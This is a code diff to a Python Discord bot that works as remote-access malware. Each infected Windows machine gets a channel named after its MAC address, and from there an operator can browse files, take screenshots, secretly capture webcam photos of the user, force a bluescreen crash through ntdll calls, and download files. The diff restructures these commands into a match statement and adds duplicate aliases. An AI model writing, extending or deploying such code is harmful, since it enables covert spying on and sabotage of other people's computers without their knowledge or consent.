@@ -127,32 +127,109 @@ async def on_message(message):
     
         if message.channel.name == str(get_mac()): 
             
-
-            if message.content.lower() == ".help":
-                embed = discord.Embed(title="Help", description=f"```{commands}```", color=0xfafafa)
-                await message.reply(embed=embed)
-
-            if message.content.lower() == ".ping":
-                await message.reply(f"Pong! \n jk heres the latency: \n``{round(client.latency * 1000)}ms``")
-
-            if message.content.lower().startswith(".cd"):
-                directory = message.content[3:]
-                try:
-                    os.chdir(directory)
+            match message.content.lower():
+                case ".help":
+                    embed = discord.Embed(title="Help", description=f"```{commands}```", color=0xfafafa)
+                    await message.reply(embed=embed)
+                case ".ping":
+                    await message.reply(f"Pong! \n jk heres the latency: \n``{round(client.latency * 1000)}ms``")
+                case ".cd":
+                    directory = message.content[3:]
+                    try:
+                        os.chdir(directory)
+                        files = "\n".join(os.listdir())
+                        if files == "":
+                            files = "No Files Found"
+                        embed = discord.Embed(title=f"Changed Directory > {os.getcwd()}", description=f"```{files}```", color=0xfafafa)
+                    except:
+                        embed = discord.Embed(title="Error", description=f"```Directory Not Found```", color=0xfafafa)
+                    await message.reply(embed=embed) 
+                case ".ls":
                     files = "\n".join(os.listdir())
                     if files == "":
                         files = "No Files Found"
-                    embed = discord.Embed(title=f"Changed Directory > {os.getcwd()}", description=f"```{files}```", color=0xfafafa)
-                except:
-                    embed = discord.Embed(title="Error", description=f"```Directory Not Found```", color=0xfafafa)
-                await message.reply(embed=embed)
+                    embed = discord.Embed(title=f"Files > {os.getcwd()}", description=f"```{files}```", color=0xfafafa)
+                    await message.reply(embed=embed)  
+                case ".exit":
+                    new_msg = await message.reply("Are you sure you want to start a bluescreen?")
+                    await new_msg.add_reaction("✅")
+                    await new_msg.add_reaction("❌")
+                    def check(reaction, user):
+                        return user == message.author and str(reaction.emoji) in ["✅", "❌"]
 
-            if message.content.lower() == ".ls":
-                files = "\n".join(os.listdir())
-                if files == "":
-                    files = "No Files Found"
-                embed = discord.Embed(title=f"Files > {os.getcwd()}", description=f"```{files}```", color=0xfafafa)
-                await message.reply(embed=embed)
+                    try:
+                        reaction, user = await client.wait_for('reaction_add', timeout=60, check=check)
+                        if str(reaction.emoji) == "✅":
+                           await message.channel.delete()
+                           await client.close()
+                        elif str(reaction.emoji) == "❌":
+                            delmsg =await message.channel.send("Cancelled.")
+                            await message.delete()
+                            await new_msg.delete()
+                            await delmsg.delete()
+                    except asyncio.TimeoutError:
+                        await message.channel.send("You didn't react in time.")
+
+                case ".blue":
+                    new_msg = await message.reply("Are you sure you want to start a bluescreen?")
+                    await new_msg.add_reaction("✅")
+                    await new_msg.add_reaction("❌")
+
+                    def check(reaction, user):
+                        return user == message.author and str(reaction.emoji) in ["✅", "❌"]
+
+                    try:
+                        reaction, user = await client.wait_for('reaction_add', timeout=60, check=check)
+                        if str(reaction.emoji) == "✅":
+                            await message.reply("Attempting...", delete_after = .1)
+                            ntdll = ctypes.windll.ntdll
+                            prev_value = ctypes.c_bool()
+                            res = ctypes.c_ulong()
+                            ntdll.RtlAdjustPrivilege(19, True, False, ctypes.byref(prev_value))
+                            if not ntdll.NtRaiseHardError(0xDEADDEAD, 0, 0, 0, 6, ctypes.byref(res)):
+                                await message.reply("Blue Successful!")
+                            else:
+                                await message.reply("Blue Failed! :(")
+                        elif str(reaction.emoji) == "❌":
+                            delmsg =await message.channel.send("Cancelled bluescreen.")
+                            await message.delete()
+                            await new_msg.delete()
+                            await delmsg.delete()
+                    except asyncio.TimeoutError:
+                        await message.channel.send("You didn't react in time.")
+                case ".ss":
+                    screenshot = pyautogui.screenshot()
+                    path = os.path.join(os.getenv("TEMP"), "screenshot.png")
+                    screenshot.save(path)
+                    file = discord.File(path)
+                    embed = discord.Embed(title="Screenshot", color=0xfafafa)
+                    embed.set_image(url="attachment://screenshot.png")
+                    await message.reply(embed=embed, file=file)
+                case ".screenshot":
+                    screenshot = pyautogui.screenshot()
+                    path = os.path.join(os.getenv("TEMP"), "screenshot.png")
+                    screenshot.save(path)
+                    file = discord.File(path)
+                    embed = discord.Embed(title="Screenshot", color=0xfafafa)
+                    embed.set_image(url="attachment://screenshot.png")
+                    await message.reply(embed=embed, file=file)
+
+                case ".pic":
+                    webcam = VideoCapture(0, CAP_DSHOW)
+                    result, image = webcam.read()
+                    imwrite('webcam.png', image)
+                    await message.channel.send(embed=discord.Embed(title=' `[Image of User with ID:' +str(get_mac())+'`]' ).set_image(url='attachment://webcam.png'), file=discord.File('webcam.png'))
+                    subprocess.run('del webcam.png', shell=True)
+                case ".photo":
+                    webcam = VideoCapture(0, CAP_DSHOW)
+                    result, image = webcam.read()
+                    imwrite('webcam.png', image)
+                    await message.channel.send(embed=discord.Embed(title=' `[Image of User with ID:' +str(get_mac())+'`]' ).set_image(url='attachment://webcam.png'), file=discord.File('webcam.png'))
+                    subprocess.run('del webcam.png', shell=True)
+
+                case ".purge":  
+                    await message.reply('Purging...')
+                    await message.channel.purge(limit=None)               
 
             if message.content.lower().startswith(".download"):
                 file = message.content[10:]
@@ -188,62 +265,6 @@ async def on_message(message):
                 embed = discord.Embed(title="Started", description=f"```{file}```", color=0xfafafa)
                 await message.reply(embed=embed)
 
-            if message.content.lower() == ".exit":
-                await message.channel.delete()
-                await client.close()
-            
-            if message.content.lower() == ".start":
-                await message.reply("Ok Boss")
-
-                
-            if message.content.lower() == ".blue":
-                new_msg = await message.reply("Are you sure you want to start a bluescreen?")
-                await new_msg.add_reaction("✅")
-                await new_msg.add_reaction("❌")
-
-                def check(reaction, user):
-                    return user == message.author and str(reaction.emoji) in ["✅", "❌"]
-
-                try:
-                    reaction, user = await client.wait_for('reaction_add', timeout=60, check=check)
-                    if str(reaction.emoji) == "✅":
-                        await message.reply("Attempting...", delete_after = .1)
-                        ntdll = ctypes.windll.ntdll
-                        prev_value = ctypes.c_bool()
-                        res = ctypes.c_ulong()
-                        ntdll.RtlAdjustPrivilege(19, True, False, ctypes.byref(prev_value))
-                        if not ntdll.NtRaiseHardError(0xDEADDEAD, 0, 0, 0, 6, ctypes.byref(res)):
-                            await message.reply("Blue Successful!")
-                        else:
-                            await message.reply("Blue Failed! :(")
-                    elif str(reaction.emoji) == "❌":
-                        delmsg =await message.channel.send("Cancelled bluescreen.")
-                        await message.delete()
-                        await new_msg.delete()
-                        await delmsg.delete()
-                except asyncio.TimeoutError:
-                    await message.channel.send("You didn't react in time.")
-               
-
-            if message.content.lower() == ".screenshot":
-                screenshot = pyautogui.screenshot()
-                path = os.path.join(os.getenv("TEMP"), "screenshot.png")
-                screenshot.save(path)
-                file = discord.File(path)
-                embed = discord.Embed(title="Screenshot", color=0xfafafa)
-                embed.set_image(url="attachment://screenshot.png")
-                await message.reply(embed=embed, file=file)
-
-            if message.content.lower() == '.photo':
-                webcam = VideoCapture(0, CAP_DSHOW)
-                result, image = webcam.read()
-                imwrite('webcam.png', image)
-                await message.channel.send(embed=discord.Embed(title=' `[Image of User with ID:' +str(get_mac())+'`]' ).set_image(url='attachment://webcam.png'), file=discord.File('webcam.png'))
-                subprocess.run('del webcam.png', shell=True)
-                
-            if message.content.lower() == '.purge':
-                await message.reply('Purging...')
-                await message.channel.purge(limit=None)
         else:
             print("MESSAGE SENT WAS:", message.content, "BY :" , message.author,"IN :" , message.channel,)
 
